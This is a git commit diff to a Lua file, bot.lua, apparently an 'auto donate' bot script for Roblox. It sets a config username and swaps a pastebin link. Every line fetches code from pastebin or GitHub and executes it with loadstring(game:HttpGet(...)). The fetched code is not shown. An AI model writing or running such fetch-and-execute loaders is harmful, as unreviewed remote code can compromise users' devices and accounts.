e129d5dac24ccab53918a6081ff200e04950cc41
tonpereaveclelait <antriwassim18@gmail.com>
2026-06-29 21:43:09 +0100

    changed auto donate to inscript config
    Updated the configuration and changed a script URL.

--- bot.lua
+++ bot.lua
@@ -1,3 +1,5 @@
+getgenv().CONFIG = { main = "username here" }
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Bucknbilly/scripts/refs/heads/main/Banana.lua"))()
-loadstring(game:HttpGet("https://pastebin.com/raw/hPzhWZis"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/15ARDqjY"))()
 loadstring(game:HttpGet("https://pastebin.com/raw/xuL0gvHU"))()
